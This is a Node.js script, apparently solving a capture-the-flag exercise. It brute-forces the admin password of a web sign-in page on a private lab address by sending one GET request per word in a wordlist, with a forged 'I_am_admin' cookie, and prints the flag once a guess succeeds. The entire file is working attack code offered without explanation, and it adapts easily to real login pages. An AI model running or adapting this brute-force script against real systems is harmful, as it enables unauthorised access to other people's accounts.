const fs = require('fs');
const axios = require('axios');
const process = require('process');

function readWordsFromFile(filePath) {
  const data = fs.readFileSync(filePath, 'utf-8');
  const wordsArray = data.split(/\s+/);

  return wordsArray;
}

async function makeRequest(query) {
  const response = await axios.get(`http://192.168.56.101/index.php?page=signin&username=admin&password=${query}&Login=Login`, {
    headers: {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7',
      'upgrade-insecure-requests': '1',
      'cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
      'Referer': 'http://192.168.56.101/index.php?page=signin',
      'Referrer-Policy': 'strict-origin-when-cross-origin'
    }
  });
  if (!response.data.includes('The flag is : ')) return null;
  const regex = /The flag is : (\w+)/;
  const result = response.data.match(regex);
  return result?.length ? result[1] : null;
}

async function main() {
  const words = readWordsFromFile('wordseclist.txt');

  for (const word of words) {
	console.log(`Trying ${word}`);
    const result = await makeRequest(word);
    if (result) process.exit(console.log(result));
  }
}

main();